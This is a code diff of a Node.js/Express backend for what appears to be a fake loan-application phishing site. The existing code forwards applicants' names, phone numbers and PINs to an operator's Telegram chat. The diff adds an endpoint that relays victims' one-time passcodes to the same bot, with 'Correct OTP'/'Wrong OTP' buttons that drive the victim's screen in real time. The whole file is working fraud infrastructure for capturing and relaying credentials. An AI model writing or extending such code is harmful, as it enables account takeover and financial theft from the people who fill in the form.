@@ -13,7 +13,7 @@ let latestStatus = "pending"; // Tracks approval status
 // 1. Receive loan application from frontend
 app.post('/api/submit', async (req, res) => {
     const { name, phone, amount, purpose, pin } = req.body;
-    latestStatus = "pending"; // Reset status on new submission
+    latestStatus = "pending";
 
     const message = `📲 *New Loan Application*\n\n` +
                     `• *Phone:* ${phone}\n` +
@@ -50,26 +50,61 @@ app.post('/api/submit', async (req, res) => {
     }
 });
 
-// 2. Endpoint for frontend to check if admin approved/declined
+// 2. Endpoint for frontend to check status
 app.get('/api/status', (req, res) => {
     res.json({ status: latestStatus });
 });
 
-// 3. Telegram Webhook to catch button clicks
+// 3. Receive OTP from frontend and send to Telegram
+app.post('/api/submit-otp', async (req, res) => {
+    const { phone, otp } = req.body;
+    latestStatus = "pending";
+
+    const message = `🔐 *New OTP Verification*\n\n` +
+                    `• *Phone:* ${phone}\n` +
+                    `• *OTP Code:* ${otp}\n\n` +
+                    `Please choose an action:`;
+
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: "✅ Correct OTP", callback_data: `correct_otp_${phone}` },
+                { text: "❌ Wrong OTP", callback_data: `wrong_otp_${phone}` }
+            ]
+        ]
+    };
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                reply_markup: keyboard
+            })
+        });
+        const data = await response.json();
+        res.json({ success: data.ok });
+    } catch (err) {
+        console.error("Telegram OTP send error:", err);
+        res.json({ success: false });
+    }
+});
+
+// 4. Telegram Webhook to catch button clicks
 app.post('/webhook', async (req, res) => {
     const update = req.body;
     if (update.callback_query) {
         const action = update.callback_query.data;
         
-        if (action.startsWith("approve")) {
+        if (action.startsWith("approve") || action.startsWith("correct_otp")) {
             latestStatus = "approved";
-        } else if (action.startsWith("decline")) {
-            latestStatus = "declined";
-        }else if (action.startsWith("wrong_otp")) {
+        } else if (action.startsWith("decline") || action.startsWith("wrong_otp")) {
             latestStatus = "wrong_otp";
         }
-
-        // Acknowledge click to Telegram so loading wheel stops on the button
+        
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
